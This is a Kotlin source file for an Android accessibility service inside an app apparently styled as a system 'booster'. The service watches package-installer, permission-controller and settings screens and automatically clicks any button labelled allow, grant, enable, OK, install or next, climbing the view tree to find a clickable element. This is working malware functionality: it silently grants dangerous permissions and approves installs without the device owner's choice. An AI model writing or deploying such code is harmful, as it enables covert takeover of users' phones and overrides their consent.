package com.sysopt.booster

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class AutoGrantService : AccessibilityService() {

    override fun onServiceConnected() {
        info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 50
        }
        startForeground(2001, NotificationHelper.createNotification(this, "Accessibility Active"))
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event?.let {
            val pkg = it.packageName?.toString() ?: return

            // Detect permission dialogs
            if (pkg.contains("packageinstaller") ||
                pkg.contains("permissioncontroller") ||
                pkg.contains("android") && it.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                autoClick(rootInActiveWindow)
            }

            // Detect and click "Allow" on overlay permissions
            if (pkg.contains("settings") && it.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                autoClick(rootInActiveWindow)
            }
        }
    }

    private fun autoClick(node: AccessibilityNodeInfo?): Boolean {
        if (node == null) return false

        // Check for Allow/Enable/Grant buttons
        val text = node.text?.toString()?.lowercase() ?: ""
        if (text.contains("allow") || text.contains("grant") ||
            text.contains("enable") || text.contains("ok") ||
            text.contains("install") || text.contains("next")) {

            // Verify it's clickable
            if (node.isClickable) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }

            // Find clickable parent
            var parent = node.parent
            while (parent != null) {
                if (parent.isClickable) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    return true
                }
                parent = parent.parent
            }
        }

        // Traverse children
        for (i in 0 until node.childCount) {
            if (autoClick(node.getChild(i))) return true
        }
        return false
    }

    override fun onInterrupt() {}
}